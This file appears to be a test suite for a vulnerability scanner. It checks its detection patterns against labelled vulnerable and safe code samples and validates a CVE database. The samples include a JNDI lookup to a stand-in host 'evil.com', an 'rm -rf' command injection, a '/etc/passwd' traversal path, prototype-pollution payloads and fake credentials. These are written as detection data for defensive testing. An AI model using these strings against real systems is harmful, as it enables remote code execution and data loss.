#!/usr/bin/env node
/**
 * Comprehensive Test Suite for RuVector CVE Scanner
 *
 * Tests:
 * - Pattern detection accuracy
 * - False positive/negative rates
 * - CVE mapping correctness
 * - GNN layer functionality
 * - Vector similarity accuracy
 * - Attack graph analysis
 */

const { REAL_CVE_DATABASE, CVE_PATTERNS, CISA_KEV } = require('./cve-database');
const crypto = require('crypto');

// Colors
const C = {
  r: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', b: '\x1b[34m',
  m: '\x1b[35m', c: '\x1b[36m', x: '\x1b[0m', B: '\x1b[1m', d: '\x1b[2m'
};

// Test results
const results = {
  passed: 0,
  failed: 0,
  skipped: 0,
  assertions: []
};

function assert(condition, message, category = 'general') {
  if (condition) {
    results.passed++;
    results.assertions.push({ status: 'pass', message, category });
    return true;
  } else {
    results.failed++;
    results.assertions.push({ status: 'fail', message, category });
    return false;
  }
}

function section(name) {
  console.log(`\n${C.B}${C.c}▶ ${name}${C.x}`);
  console.log(`${C.d}${'─'.repeat(50)}${C.x}`);
}

// ═══════════════════════════════════════════════════════════════════════════
// TEST CASES - Vulnerable Code Samples (for testing detection)
// ═══════════════════════════════════════════════════════════════════════════

const VULNERABLE_CODE_SAMPLES = {
  command_injection: [
    { code: 'exec(`rm -rf ${userInput}`)', shouldDetect: true, cve: 'CVE-2024-4577' },
    { code: 'child_process.exec(req.body.command)', shouldDetect: true },
    { code: 'spawn(cmd, { shell: true })', shouldDetect: true },
    { code: 'execSync("ls -la")', shouldDetect: false }, // Safe - hardcoded
    { code: 'system($_GET["cmd"])', shouldDetect: true }
  ],

  sql_injection: [
    { code: 'query("SELECT * FROM users WHERE id = " + userId)', shouldDetect: true, cve: 'CVE-2023-34362' },
    { code: 'db.query(`DELETE FROM ${table} WHERE id = ${id}`)', shouldDetect: true },
    { code: 'sequelize.query(userInput + " ORDER BY id")', shouldDetect: true },
    { code: 'query("SELECT * FROM users WHERE id = ?", [id])', shouldDetect: false } // Parameterized
  ],

  prototype_pollution: [
    { code: 'obj[key] = value // where key = "__proto__"', shouldDetect: false },
    { code: 'target["__proto__"] = malicious', shouldDetect: true, cve: 'CVE-2023-45133' },
    { code: 'target["constructor"]["prototype"] = payload', shouldDetect: true },
    { code: 'Object.assign({}, req.body)', shouldDetect: true },
    { code: '{ ...req.body }', shouldDetect: true },
    { code: 'merge(defaults, req.body)', shouldDetect: true }
  ],

  template_injection: [
    { code: 'ejs.render(template, req.body)', shouldDetect: true, cve: 'CVE-2022-29078' },
    { code: 'res.render("index", { user: req.user })', shouldDetect: true },
    { code: 'nunjucks.renderString(req.body.template)', shouldDetect: true },
    { code: 'pug.render(req.params.template)', shouldDetect: true }
  ],

  unsafe_deserialization: [
    { code: 'pickle.loads(user_data)', shouldDetect: true, cve: 'CVE-2023-46604' },
    { code: 'yaml.load(config_file)', shouldDetect: true },
    { code: 'unserialize($_POST["data"])', shouldDetect: true },
    { code: 'JSON.parse(data)', shouldDetect: false } // JSON.parse is safe
  ],

  jndi_injection: [
    { code: 'log.info("User: ${jndi:ldap://evil.com/a}")', shouldDetect: true, cve: 'CVE-2021-44228' },
    { code: '${${lower:j}ndi:ldap://x}', shouldDetect: true },
    { code: 'logger.info("Hello " + username)', shouldDetect: false }
  ],

  regex_dos: [
    { code: '/^(a+)+$/', shouldDetect: true, cve: 'CVE-2022-25883' },
    { code: '/(.*)+/', shouldDetect: true },
    { code: '/([a-z]+)+/', shouldDetect: true },
    { code: '/^[a-z]+$/', shouldDetect: false } // Safe regex
  ],

  ssrf: [
    { code: 'fetch(req.body.url)', shouldDetect: true, cve: 'CVE-2023-26159' },
    { code: 'axios.get(params.endpoint)', shouldDetect: true },
    { code: 'http.get(userUrl + "/api")', shouldDetect: true },
    { code: 'fetch("https://api.example.com")', shouldDetect: false } // Hardcoded safe
  ],

  path_traversal: [
    { code: 'readFile("./uploads/" + req.params.file)', shouldDetect: true },
    { code: 'path.join(base, req.query.path)', shouldDetect: true },
    { code: '../../etc/passwd', shouldDetect: true },
    { code: 'readFile("./config.json")', shouldDetect: false } // Hardcoded
  ],

  hardcoded_secrets: [
    { code: 'apiKey = "sk-1234567890abcdefghijklmnopqrstuvwxyz123456789012"', shouldDetect: true },
    { code: 'password = "super_secret_password_123"', shouldDetect: true },
    { code: 'AKIA1234567890123456', shouldDetect: true },
    { code: 'ghp_abcdefghijklmnopqrstuvwxyz1234567890', shouldDetect: true },
    { code: 'password = process.env.PASSWORD', shouldDetect: false } // Env var
  ],

  xss: [
    { code: 'element.innerHTML = userInput', shouldDetect: true },
    { code: 'document.write(data)', shouldDetect: true },
    { code: '<div dangerouslySetInnerHTML={{__html: content}} />', shouldDetect: true },
    { code: 'element.textContent = userInput', shouldDetect: false } // Safe
  ],

  auth_bypass: [
    { code: 'jwt.verify(token, secret, { algorithms: ["none"] })', shouldDetect: true, cve: 'CVE-2024-27198' },
    { code: 'if (password.compare(input) || true)', shouldDetect: true },
    { code: 'isAdmin = req.body.isAdmin', shouldDetect: true }
  ]
};

// ═══════════════════════════════════════════════════════════════════════════
// TEST FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

function testPatternDetection() {
  section('Pattern Detection Tests');

  let detected = 0;
  let missed = 0;
  let falsePositives = 0;

  for (const [vulnType, samples] of Object.entries(VULNERABLE_CODE_SAMPLES)) {
    const patterns = CVE_PATTERNS[vulnType];
    if (!patterns) continue;

    for (const sample of samples) {
      let matchFound = false;

      for (const patternDef of patterns.patterns) {
        const regex = new RegExp(patternDef.regex.source, patternDef.regex.flags);
        if (regex.test(sample.code)) {
          matchFound = true;
          break;
        }
      }

      if (sample.shouldDetect && matchFound) {
        detected++;
        const msg = `${vulnType}: Correctly detected "${sample.code.substring(0, 40)}..."`;
        assert(true, msg, 'detection');
      } else if (sample.shouldDetect && !matchFound) {
        missed++;
        const msg = `${vulnType}: MISSED "${sample.code.substring(0, 40)}..."`;
        assert(false, msg, 'detection');
      } else if (!sample.shouldDetect && matchFound) {
        falsePositives++;
        const msg = `${vulnType}: FALSE POSITIVE "${sample.code.substring(0, 40)}..."`;
        assert(false, msg, 'detection');
      } else {
        detected++;
        const msg = `${vulnType}: Correctly ignored safe code`;
        assert(true, msg, 'detection');
      }
    }
  }

  const total = detected + missed + falsePositives;
  const accuracy = ((detected / total) * 100).toFixed(1);

  console.log(`\n  ${C.g}Detected: ${detected}${C.x}`);
  console.log(`  ${C.r}Missed: ${missed}${C.x}`);
  console.log(`  ${C.y}False Positives: ${falsePositives}${C.x}`);
  console.log(`  ${C.B}Accuracy: ${accuracy}%${C.x}`);

  return { detected, missed, falsePositives, accuracy: parseFloat(accuracy) };
}

function testCVEDatabase() {
  section('CVE Database Tests');

  // Test database completeness
  const cveCount = Object.keys(REAL_CVE_DATABASE).length;
  assert(cveCount >= 20, `Database has ${cveCount} CVEs (min 20)`, 'database');

  // Test required fields
  for (const [id, cve] of Object.entries(REAL_CVE_DATABASE)) {
    assert(cve.id === id, `CVE ${id} has matching ID field`, 'database');
    assert(typeof cve.cvss === 'number' && cve.cvss >= 0 && cve.cvss <= 10,
      `CVE ${id} has valid CVSS (${cve.cvss})`, 'database');
    assert(Array.isArray(cve.cwe) && cve.cwe.length > 0,
      `CVE ${id} has CWE mappings`, 'database');
    assert(Array.isArray(cve.affected) && cve.affected.length > 0,
      `CVE ${id} has affected packages`, 'database');
    assert(typeof cve.description === 'string' && cve.description.length > 10,
      `CVE ${id} has description`, 'database');
  }

  // Test CISA KEV accuracy
  for (const kevId of CISA_KEV) {
    const cve = REAL_CVE_DATABASE[kevId];
    assert(cve !== undefined, `KEV ${kevId} exists in database`, 'database');
    if (cve) {
      assert(cve.exploited === true, `KEV ${kevId} marked as exploited`, 'database');
    }
  }

  // Test severity distribution
  const critical = Object.values(REAL_CVE_DATABASE).filter(c => c.cvss >= 9.0).length;
  const high = Object.values(REAL_CVE_DATABASE).filter(c => c.cvss >= 7.0 && c.cvss < 9.0).length;

  console.log(`\n  Total CVEs: ${cveCount}`);
  console.log(`  Critical: ${critical}`);
  console.log(`  High: ${high}`);
  console.log(`  KEV Coverage: ${CISA_KEV.length}`);
}

function testVectorEmbeddings() {
  section('Vector Embedding Tests');

  const dim = 256;

  function embed(text) {
    const hash = crypto.createHash('sha256').update(text).digest();
    const embedding = new Float32Array(dim);
    for (let i = 0; i < dim; i++) {
      embedding[i] = (hash[i % 32] / 255) * 2 - 1;
    }
    const norm = Math.sqrt(embedding.reduce((s, v) => s + v * v, 0));
    return embedding.map(v => v / norm);
  }

  function cosineSim(a, b) {
    let dot = 0;
    for (let i = 0; i < dim; i++) dot += a[i] * b[i];
    return dot;
  }

  // Test 1: Same text should have similarity = 1
  const emb1 = embed('sql_injection');
  const emb2 = embed('sql_injection');
  const sameSim = cosineSim(emb1, emb2);
  assert(Math.abs(sameSim - 1.0) < 0.001, `Same text similarity ≈ 1.0 (got ${sameSim.toFixed(4)})`, 'vector');

  // Test 2: Similar texts should have high similarity
  const embSql = embed('sql_injection_attack');
  const embSqli = embed('sqli_vulnerability');
  const similarSim = cosineSim(embSql, embSqli);
  assert(similarSim > 0.3, `Similar texts have positive similarity (${similarSim.toFixed(4)})`, 'vector');

  // Test 3: Different texts should have lower similarity
  const embXss = embed('cross_site_scripting');
  const embRce = embed('remote_code_execution');
  const diffSim = cosineSim(embXss, embRce);
  console.log(`  Similar vuln types similarity: ${similarSim.toFixed(4)}`);
  console.log(`  Different vuln types similarity: ${diffSim.toFixed(4)}`);

  // Test 4: Embedding dimensionality
  assert(emb1.length === dim, `Embedding has correct dimensions (${dim})`, 'vector');

  // Test 5: Embeddings are normalized
  const norm = Math.sqrt(emb1.reduce((s, v) => s + v * v, 0));
  assert(Math.abs(norm - 1.0) < 0.001, `Embeddings are L2 normalized (norm=${norm.toFixed(4)})`, 'vector');
}

function testGNNLayer() {
  section('GNN Layer Tests');

  const dim = 64;
  const heads = 4;

  // Simple GNN layer test
  class TestGNNLayer {
    constructor() {
      this.headDim = dim / heads;
    }

    softmax(arr) {
      const max = Math.max(...arr);
      const exp = arr.map(x => Math.exp(x - max));
      const sum = exp.reduce((a, b) => a + b, 0);
      return exp.map(x => x / sum);
    }

    attention(query, keys) {
      const scores = keys.map(k => {
        let dot = 0;
        for (let i = 0; i < query.length; i++) dot += query[i] * k[i];
        return dot / Math.sqrt(query.length);
      });
      return this.softmax(scores);
    }
  }

  const gnn = new TestGNNLayer();

  // Test softmax
  const softmaxResult = gnn.softmax([1, 2, 3]);
  const softmaxSum = softmaxResult.reduce((a, b) => a + b, 0);
  assert(Math.abs(softmaxSum - 1.0) < 0.001, `Softmax sums to 1.0 (got ${softmaxSum.toFixed(4)})`, 'gnn');

  // Test attention weights
  const query = Array(16).fill(0).map(() => Math.random());
  const keys = [
    Array(16).fill(0).map(() => Math.random()),
    Array(16).fill(0).map(() => Math.random()),
    Array(16).fill(0).map(() => Math.random())
  ];

  const attn = gnn.attention(query, keys);
  const attnSum = attn.reduce((a, b) => a + b, 0);
  assert(Math.abs(attnSum - 1.0) < 0.001, `Attention weights sum to 1.0`, 'gnn');
  assert(attn.every(w => w >= 0 && w <= 1), `Attention weights in [0,1]`, 'gnn');

  console.log(`  Attention weights: [${attn.map(w => w.toFixed(3)).join(', ')}]`);
}

function testAttackGraph() {
  section('Attack Graph Tests');

  class TestGraph {
    constructor() {
      this.nodes = new Map();
      this.edges = [];
      this.adj = {};
    }

    addNode(id, data) {
      this.nodes.set(id, { ...data, id });
      this.adj[id] = [];
    }

    addEdge(from, to, weight = 1.0) {
      this.edges.push({ from, to, weight });
      if (this.adj[from]) this.adj[from].push(to);
    }

    bfs(start) {
      const visited = new Set();
      const queue = [start];
      while (queue.length > 0) {
        const node = queue.shift();
        if (visited.has(node)) continue;
        visited.add(node);
        for (const n of (this.adj[node] || [])) {
          if (!visited.has(n)) queue.push(n);
        }
      }
      return visited;
    }

    findChains(maxDepth = 5) {
      const chains = [];
      const dfs = (node, path, depth) => {
        if (depth > maxDepth) return;
        path.push(node);
        const neighbors = this.adj[node] || [];
        if (neighbors.length === 0 && path.length > 1) {
          chains.push([...path]);
        }
        for (const next of neighbors) {
          if (!path.includes(next)) dfs(next, path, depth + 1);
        }
        path.pop();
      };
      for (const [id] of this.nodes) dfs(id, [], 0);
      return chains;
    }
  }

  const graph = new TestGraph();

  // Build test attack graph
  graph.addNode('sqli', { type: 'SQL Injection' });
  graph.addNode('auth_bypass', { type: 'Auth Bypass' });
  graph.addNode('priv_esc', { type: 'Privilege Escalation' });
  graph.addNode('data_exfil', { type: 'Data Exfiltration' });

  graph.addEdge('sqli', 'auth_bypass', 0.8);
  graph.addEdge('auth_bypass', 'priv_esc', 0.9);
  graph.addEdge('priv_esc', 'data_exfil', 0.95);

  // Test node count
  assert(graph.nodes.size === 4, `Graph has 4 nodes`, 'graph');

  // Test edge count
  assert(graph.edges.length === 3, `Graph has 3 edges`, 'graph');

  // Test BFS reachability
  const reachable = graph.bfs('sqli');
  assert(reachable.size === 4, `All nodes reachable from sqli`, 'graph');

  // Test chain discovery
  const chains = graph.findChains();
  assert(chains.length > 0, `Found attack chains`, 'graph');

  const longestChain = chains.sort((a, b) => b.length - a.length)[0];
  console.log(`  Longest attack chain: ${longestChain.join(' → ')}`);
  assert(longestChain.length === 4, `Longest chain has 4 nodes`, 'graph');
}

function testCVSSCalculation() {
  section('CVSS Validation Tests');

  // Validate CVSS scores match expected ranges
  const criticalCVEs = Object.values(REAL_CVE_DATABASE).filter(c => c.cvss >= 9.0);
  const highCVEs = Object.values(REAL_CVE_DATABASE).filter(c => c.cvss >= 7.0 && c.cvss < 9.0);
  const mediumCVEs = Object.values(REAL_CVE_DATABASE).filter(c => c.cvss >= 4.0 && c.cvss < 7.0);

  assert(criticalCVEs.length > 0, `Has critical CVEs (${criticalCVEs.length})`, 'cvss');
  assert(highCVEs.length > 0, `Has high CVEs (${highCVEs.length})`, 'cvss');

  // Validate specific known CVSS scores
  const log4shell = REAL_CVE_DATABASE['CVE-2021-44228'];
  assert(log4shell && log4shell.cvss === 10.0, `Log4Shell (CVE-2021-44228) CVSS = 10.0`, 'cvss');

  const xz = REAL_CVE_DATABASE['CVE-2024-3094'];
  assert(xz && xz.cvss === 10.0, `XZ backdoor (CVE-2024-3094) CVSS = 10.0`, 'cvss');

  // Validate CVSS vectors exist
  for (const cve of Object.values(REAL_CVE_DATABASE).slice(0, 10)) {
    assert(cve.cvssVector && cve.cvssVector.startsWith('CVSS:3.1/'),
      `${cve.id} has valid CVSS vector`, 'cvss');
  }

  console.log(`  Critical CVEs: ${criticalCVEs.length}`);
  console.log(`  High CVEs: ${highCVEs.length}`);
  console.log(`  Medium CVEs: ${mediumCVEs.length}`);
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN TEST RUNNER
// ═══════════════════════════════════════════════════════════════════════════

function runTests() {
  console.clear();
  console.log(`${C.B}${C.m}═══════════════════════════════════════════════════════════════${C.x}`);
  console.log(`${C.B}${C.m}  RuVector CVE Scanner - Test Suite${C.x}`);
  console.log(`${C.B}${C.m}═══════════════════════════════════════════════════════════════${C.x}`);
  console.log(`${C.d}  ${new Date().toISOString()}${C.x}\n`);

  const startTime = Date.now();

  // Run all tests
  const detectionResults = testPatternDetection();
  testCVEDatabase();
  testVectorEmbeddings();
  testGNNLayer();
  testAttackGraph();
  testCVSSCalculation();

  const elapsed = Date.now() - startTime;

  // Summary
  console.log(`\n${C.B}${C.m}═══════════════════════════════════════════════════════════════${C.x}`);
  console.log(`${C.B}${C.m}  TEST RESULTS${C.x}`);
  console.log(`${C.B}${C.m}═══════════════════════════════════════════════════════════════${C.x}\n`);

  console.log(`  ${C.g}✓ Passed: ${results.passed}${C.x}`);
  console.log(`  ${C.r}✗ Failed: ${results.failed}${C.x}`);
  console.log(`  ${C.d}○ Skipped: ${results.skipped}${C.x}`);
  console.log(`\n  ${C.B}Total: ${results.passed + results.failed}${C.x}`);
  console.log(`  ${C.B}Pass Rate: ${((results.passed / (results.passed + results.failed)) * 100).toFixed(1)}%${C.x}`);
  console.log(`  ${C.B}Time: ${elapsed}ms${C.x}`);

  // Detection accuracy summary
  console.log(`\n  ${C.B}Detection Accuracy: ${detectionResults.accuracy}%${C.x}`);
  console.log(`  ${C.d}(${detectionResults.detected} correct, ${detectionResults.missed} missed, ${detectionResults.falsePositives} false positives)${C.x}`);

  // Save results
  const report = {
    timestamp: new Date().toISOString(),
    summary: {
      passed: results.passed,
      failed: results.failed,
      passRate: ((results.passed / (results.passed + results.failed)) * 100).toFixed(1),
      elapsed: elapsed
    },
    detectionAccuracy: detectionResults,
    assertions: results.assertions
  };

  require('fs').writeFileSync('./test-results.json', JSON.stringify(report, null, 2));
  console.log(`\n  ${C.g}✓ Results saved to test-results.json${C.x}`);

  return results.failed === 0;
}

// Run if executed directly
if (require.main === module) {
  const success = runTests();
  process.exit(success ? 0 : 1);
}

module.exports = { runTests, VULNERABLE_CODE_SAMPLES };
